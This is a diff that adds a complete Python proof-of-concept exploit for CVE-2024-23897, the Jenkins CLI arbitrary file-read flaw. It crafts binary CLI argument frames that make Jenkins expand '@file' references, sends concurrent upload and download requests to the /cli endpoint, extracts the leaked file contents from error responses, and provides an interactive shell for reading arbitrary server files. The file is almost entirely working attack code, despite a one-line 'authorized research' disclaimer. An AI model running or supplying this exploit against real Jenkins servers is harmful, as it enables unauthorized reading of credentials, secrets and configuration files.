@@ -1,0 +1,317 @@
+#!/usr/bin/env python3
+# DISCLAIMER: For authorized security research and defensive testing only.
+# -*- coding: utf-8 -*-
+"""
+This script is used to exploit CVE-2024-23897 (Jenkins file-read).
+This script was created to parse the output file content correctly.
+Limitations: https://www.jenkins.io/security/advisory/2024-01-24/#binary-files-note
+"""
+
+# Imports
+import argparse
+from cmd import Cmd
+import os
+import re
+import requests
+import struct
+import threading
+import time
+import urllib.parse
+import uuid
+import base64
+
+# Disable SSL self-signed certificate warnings
+from urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+
+# Constants
+RED = "\033[91m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+ENDC = "\033[0m"
+ENCODING = "UTF-8"
+
+
+class File_Terminal(Cmd):
+    """This class provides a terminal prompt for file read attempts."""
+
+    intro = "Welcome to the Jenkins file-read shell. Type help or ? to list commands.\n"
+    prompt = "file> "
+    file = None
+
+    def __init__(self, read_file_func):
+        self.read_file = read_file_func
+        super().__init__()
+
+    def do_cat(self, file_path):
+        """Retrieve file contents."""
+        self.read_file(file_path)
+
+    def do_exit(self, *args):
+        """Exit the terminal."""
+        return True
+
+    default = do_cat
+
+
+class Op:
+    ARG = 0
+    LOCALE = 1
+    ENCODING = 2
+    START = 3
+    EXIT = 4
+    STDIN = 5
+    END_STDIN = 6
+    STDOUT = 7
+    STDERR = 8
+
+
+def send_upload_request(uuid_str, file_path):
+    time.sleep(0.3)
+
+    try:
+        # Construct payload
+        data = jenkins_arg("connect-node", Op.ARG) + jenkins_arg("@" + file_path, Op.ARG) + jenkins_arg(ENCODING, Op.ENCODING) + jenkins_arg("en", Op.LOCALE) + jenkins_arg("", Op.START)
+
+        # Prepare headers with authentication if provided
+        headers = {
+            "User-Agent": args.useragent,
+            "Session": uuid_str,
+            "Side": "upload",
+            "Content-type": "application/octet-stream",
+        }
+        
+        if args.username and args.password:
+            auth_str = f"{args.username}:{args.password}"
+            auth_bytes = auth_str.encode('ascii')
+            base64_auth = base64.b64encode(auth_bytes).decode('ascii')
+            headers["Authorization"] = f"Basic {base64_auth}"
+
+        # Send upload request
+        r = requests.post(
+            url=args.url + "/cli?remoting=false",
+            headers=headers,
+            data=data,
+            proxies=proxies,
+            timeout=timeout,
+            verify=False,
+        )
+
+    except requests.exceptions.Timeout:
+        print(f"{RED}[-] Request timed out{ENDC}")
+        return False
+    except Exception as e:
+        print(f"{RED}[-] Error in download request: {str(e)}{ENDC}")
+        return False
+
+
+def jenkins_arg(string, operation) -> bytes:
+    out_bytes = b"\x00\x00"
+    out_bytes += struct.pack(">H", len(string) + 2)
+    out_bytes += bytes([operation])
+    out_bytes += struct.pack(">H", len(string))
+    out_bytes += string.encode("UTF-8")
+    return out_bytes
+
+
+def safe_filename(path):
+    # Get the basename of the path
+    safe_path = path.replace("/", "_")
+    # Replace non-alphanumeric characters (except underscores) with underscores
+    safe_name = "".join(c if c.isalnum() or c == "_" else "_" for c in safe_path)
+    return safe_name
+
+
+def send_download_request(uuid_str, file_path):
+    file_contents = b""
+    try:
+        # Prepare headers with authentication if provided
+        headers = {
+            "User-Agent": args.useragent,
+            "Session": uuid_str,
+            "Side": "download"
+        }
+        
+        if args.username and args.password:
+            auth_str = f"{args.username}:{args.password}"
+            auth_bytes = auth_str.encode('ascii')
+            base64_auth = base64.b64encode(auth_bytes).decode('ascii')
+            headers["Authorization"] = f"Basic {base64_auth}"
+
+        # Send download request
+        r = requests.post(
+            url=args.url + "/cli?remoting=false",
+            headers=headers,
+            proxies=proxies,
+            timeout=timeout,
+            verify=False
+        )
+
+        # Debug response
+        if args.verbose:
+            print(f"{YELLOW}[*] Response status code: {r.status_code}{ENDC}")
+            print(f"{YELLOW}[*] Response headers: {r.headers}{ENDC}")
+            print(f"{YELLOW}[*] Raw response (hex):{ENDC}")
+            print(r.content.hex())
+
+        # Parse response content
+        response = r.content
+        if response:
+            if b"No such file:" in response:
+                print(f"{RED}[-] File does not exist{ENDC}")
+                return False
+            elif b"Authentication required" in response:
+                print(f"{RED}[-] Authentication failed. Please check your credentials.{ENDC}")
+                return False
+            
+            # Process the response content
+            content_lines = []
+            lines = response.split(b"\n")
+            
+            for line in lines:
+                # Remove null bytes
+                line = line.replace(b"\x00", b"")
+                
+                # Skip empty lines and pure error messages
+                if not line.strip() or line.strip() == b"ERROR:":
+                    continue
+                
+                # Handle "No such agent" lines - extract content from error message
+                if b": No such agent" in line:
+                    # Get the content before the error message
+                    content = line[:line.find(b": No such agent")]
+                    
+                    # Check if this is a variable assignment
+                    if b"=" in content:
+                        var_name, var_value = content.split(b"=", 1)
+                        # Try to extract the actual value from quotes in the error message
+                        match = re.search(b'"([^"]*)"', line)
+                        if match:
+                            # Extract just the value part after the equals sign
+                            error_content = match.group(1)
+                            if b"=" in error_content:
+                                # If the quoted content contains an equals sign, take everything after it
+                                error_content = error_content.split(b"=", 1)[1]
+                                # Check if the original value was quoted
+                                if var_value.strip().startswith(b'"'):
+                                    content = var_name + b'="' + error_content + b'"'
+                                else:
+                                    content = var_name + b"=" + error_content
+                    else:
+                        # Not a variable assignment, try to extract quoted content
+                        match = re.search(b'"([^"]*)"', line)
+                        if match:
+                            content = match.group(1)
+                    
+                    if content.strip():
+                        content_lines.append(content.strip())
+                # Handle direct content lines (not error messages)
+                elif b"ERROR:" not in line and line.strip():
+                    content_lines.append(line.strip())
+            
+            # Join all valid content lines
+            if content_lines:
+                file_contents = b"\n".join(content_lines)
+            else:
+                # For very small files that might appear in error messages
+                error_content = response.replace(b"\x00", b"").strip()
+                if error_content and b"ERROR:" not in error_content:
+                    file_contents = error_content
+
+    except requests.exceptions.Timeout:
+        print(f"{RED}[-] Request timed out{ENDC}")
+        return False
+    except Exception as e:
+        print(f"{RED}[-] Error in download request:{ENDC} {str(e)}")
+        return False
+
+    # Save file
+    if args.save:
+        safe_path = safe_filename(file_path).strip("_")
+        if not os.path.exists(safe_path) or args.overwrite:
+            with open(safe_path, "wb") as f:
+                f.write(file_contents)
+            if args.verbose:
+                print(f"{YELLOW}[*] File saved to {safe_path}{ENDC}")
+        else:
+            if args.verbose:
+                print(f"{YELLOW}[*] File already saved to {safe_path}{ENDC}")
+
+    # Print contents
+    if file_contents:
+        try:
+            # Try to decode as UTF-8 first
+            decoded_content = file_contents.decode(ENCODING, errors="replace")
+            if args.verbose:
+                print(f"{YELLOW}[*] Decoded content length: {len(decoded_content)}{ENDC}")
+            
+            # Handle single-line content (like version numbers)
+            if not decoded_content.strip().count('\n'):
+                print(decoded_content.strip())
+            else:
+                # Split into lines and print each non-empty line
+                for line in decoded_content.splitlines():
+                    if line.strip():
+                        print(line)
+        except UnicodeDecodeError:
+            # If UTF-8 fails, try to print as hex
+            print(f"{YELLOW}[*] Binary content detected. Showing hex dump:{ENDC}")
+            print(file_contents.hex())
+    else:
+        print("<empty>")
+
+    return True
+
+
+def read_file(file_path):
+    # Create random UUID
+    uuid_str = str(uuid.uuid4())
+
+    # Send upload/download requests
+    upload_thread = threading.Thread(target=send_upload_request, args=(uuid_str, file_path))
+    download_thread = threading.Thread(target=send_download_request, args=(uuid_str, file_path))
+    upload_thread.start()
+    download_thread.start()
+    upload_thread.join()
+    download_thread.join()
+
+
+if __name__ == "__main__":
+    # Parse arguments
+    parser = argparse.ArgumentParser(description="POC for CVE-2024-23897 (Jenkins file read)")
+    parser.add_argument("-u", "--url", type=str, required=True, help="Jenkins URL")
+    parser.add_argument(
+        "-a",
+        "--useragent",
+        type=str,
+        required=False,
+        help="User agent to use when sending requests",
+        default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
+    )
+    parser.add_argument("-f", "--file", type=str, required=False, help="File path to read")
+    parser.add_argument("-t", "--timeout", type=int, default=3, required=False, help="Request timeout")
+    parser.add_argument("-s", "--save", action="store_true", required=False, help="Save file contents")
+    parser.add_argument("-o", "--overwrite", action="store_true", required=False, help="Overwrite existing files")
+    parser.add_argument("-p", "--proxy", type=str, required=False, help="HTTP(s) proxy to use when sending requests (i.e. -p http://127.0.0.1:8080)")
+    parser.add_argument("-v", "--verbose", action="store_true", required=False, help="Verbosity enabled - additional output flag")
+    parser.add_argument("--username", type=str, required=False, help="Jenkins username for authentication")
+    parser.add_argument("--password", type=str, required=False, help="Jenkins password or API token for authentication")
+    args = parser.parse_args()
+
+    # Input-checking
+    if not args.url.startswith("http://") and not args.url.startswith("https://"):
+        args.url = "http://" + args.url
+    args.url = urllib.parse.urlparse(args.url).geturl().strip("/")
+    if args.proxy:
+        proxies = {"http": args.proxy, "https": args.proxy}
+    else:
+        proxies = {}
+    timeout = args.timeout
+
+    # Execute
+    if args.file:
+        read_file(args.file)
+    else:
+        File_Terminal(read_file).cmdloop()
